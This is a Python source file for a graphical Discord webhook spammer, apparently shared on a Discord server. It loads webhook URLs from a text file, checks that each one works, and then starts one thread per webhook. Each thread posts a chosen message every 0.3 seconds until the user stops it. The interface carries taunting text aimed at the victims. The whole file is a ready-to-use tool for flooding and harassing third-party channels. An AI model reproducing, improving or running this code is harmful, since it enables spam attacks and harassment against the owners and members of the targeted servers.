# this tool free and open source for everyone by bullet | najmashop (https://discord.gg/dbm) Tnx for ues..


import sys
import requests
import threading
import time
from PyQt5.QtWidgets import (
    QApplication, QWidget, QLabel, QLineEdit, QVBoxLayout, QPushButton,
    QTextEdit, QHBoxLayout, QSpacerItem, QSizePolicy
)
from PyQt5.QtGui import QPixmap, QFont
from PyQt5.QtCore import Qt, QObject, pyqtSignal
from io import BytesIO

class SpammerWorker(QObject):
    log_signal = pyqtSignal(str)
    finished = pyqtSignal()

    def __init__(self, webhook_url, message, running_flag):
        super().__init__()
        self.webhook_url = webhook_url
        self.message = message
        self.running_flag = running_flag

    def run(self):
        while self.running_flag():
            try:
                data = {"content": self.message}
                response = requests.post(self.webhook_url, json=data)
                if response.status_code == 204:
                    self.log_signal.emit(f"[✔] تم الإرسال إلى: {self.webhook_url}")
                else:
                    self.log_signal.emit(f"[✖] فشل الإرسال لـ {self.webhook_url} | كود: {response.status_code}")
            except Exception as e:
                self.log_signal.emit(f"[!] خطأ: {e}")
            time.sleep(0.3)
        self.finished.emit()


class WebhookSpammer(QWidget):
    def __init__(self):
        super().__init__()
        self.running = False
        self.threads = []
        self.initUI()

    def initUI(self):
        self.setWindowTitle('ByBULLET. .GG/DBM')
        self.setFixedSize(500, 700)
        self.setStyleSheet("background-color: black;")

        layout = QVBoxLayout()

        self.log_output = QTextEdit()
        self.log_output.setFixedHeight(150)
        self.log_output.setStyleSheet("background-color: black; color: red; border: 2px solid red;")
        self.log_output.setReadOnly(True)
        layout.addWidget(self.log_output)

        image_container = QHBoxLayout()
        image_container.addSpacerItem(QSpacerItem(40, 20, QSizePolicy.Expanding, QSizePolicy.Minimum))

        self.logo = QLabel(self)
        image_url = "https://i.ibb.co/TqRwRHpT/image-removebg-preview-4.png"
        try:
            response = requests.get(image_url)
            image_data = BytesIO(response.content)
            pixmap = QPixmap()
            pixmap.loadFromData(image_data.read())
            fixed_pixmap = pixmap.scaled(250, 250, Qt.KeepAspectRatio, Qt.SmoothTransformation)
            self.logo.setPixmap(fixed_pixmap)
            self.logo.setFixedSize(250, 250)
        except:
            self.logo.setText("[Image Load Error]")
            self.logo.setStyleSheet("color: red;")
            self.logo.setFixedSize(250, 250)

        self.logo.setAlignment(Qt.AlignCenter)
        image_container.addWidget(self.logo)
        image_container.addSpacerItem(QSpacerItem(40, 20, QSizePolicy.Expanding, QSizePolicy.Minimum))
        layout.addLayout(image_container)

        alert_label = QLabel("You Have Been Fucked ByBULLET | 1644Group.")
        alert_label.setStyleSheet("color: red; font-weight: bold;")
        alert_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(alert_label)

        title_label = QLabel("its Me BULLET")
        title_label.setStyleSheet("color: white; font-weight: bold;")
        title_label.setFont(QFont('Arial', 20))
        title_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(title_label)

        self.message_input = QLineEdit()
        self.message_input.setPlaceholderText("Enter the message to send...")
        self.message_input.setStyleSheet("background-color: black; color: red; border: 2px solid red;")
        layout.addWidget(self.message_input)

        btn_layout = QHBoxLayout()

        self.check_btn = QPushButton("Check")
        self.check_btn.setStyleSheet("background-color: orange; color: black; font-weight: bold;")
        self.check_btn.clicked.connect(self.check_webhooks)
        btn_layout.addWidget(self.check_btn)

        self.start_btn = QPushButton("Start")
        self.start_btn.setStyleSheet("background-color: red; color: black; font-weight: bold;")
        self.start_btn.clicked.connect(self.start_spam)
        btn_layout.addWidget(self.start_btn)

        self.stop_btn = QPushButton("Stop")
        self.stop_btn.setStyleSheet("background-color: white; color: black; font-weight: bold;")
        self.stop_btn.clicked.connect(self.stop_spam)
        btn_layout.addWidget(self.stop_btn)

        layout.addLayout(btn_layout)
        self.setLayout(layout)

    def append_log(self, text):
        self.log_output.append(text)

    def load_webhooks(self, file_path='webhook.txt'):
        try:
            with open(file_path, 'r') as file:
                webhooks = []
                for line in file:
                    line = line.strip()
                    if line.startswith("Webhook Url :"):
                        url = line.replace("Webhook Url :", "").strip()
                        if url:
                            webhooks.append(url)
            return webhooks
        except FileNotFoundError:
            self.append_log("ملف الويبهوكات غير موجود أتأكد انو موجود ومحطوط بشكل صحيح")
            return []

    def start_spam(self):
        message = self.message_input.text()
        if not message:
            self.append_log("⚠ حط الرسالة أولاً !")
            return

        self.running = True
        self.append_log("🚀 بلش ضرب...")

        webhooks = self.load_webhooks()
        for webhook in webhooks:
            worker = SpammerWorker(webhook, message, lambda: self.running)
            worker.log_signal.connect(self.append_log)
            t = threading.Thread(target=worker.run, daemon=True)
            self.threads.append((t, worker))
            t.start()

    def stop_spam(self):
        self.running = False
        self.append_log("🛑 تم توقيف الأرسال للويبهوك.")

    def check_webhooks(self):
        self.append_log("🔍 جاري فحص الويبهوكات...")
        webhooks = self.load_webhooks()

        def check_url(url):
            try:
                response = requests.get(url)
                if response.status_code == 200:
                    self.append_log(f"[VALID] {url}")
                else:
                    self.append_log(f"[INVALID] {url}")
            except:
                self.append_log(f"[ERROR] {url}")

        for webhook in webhooks:
            threading.Thread(target=check_url, args=(webhook,), daemon=True).start()


if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = WebhookSpammer()
    ex.show()
    sys.exit(app.exec_())
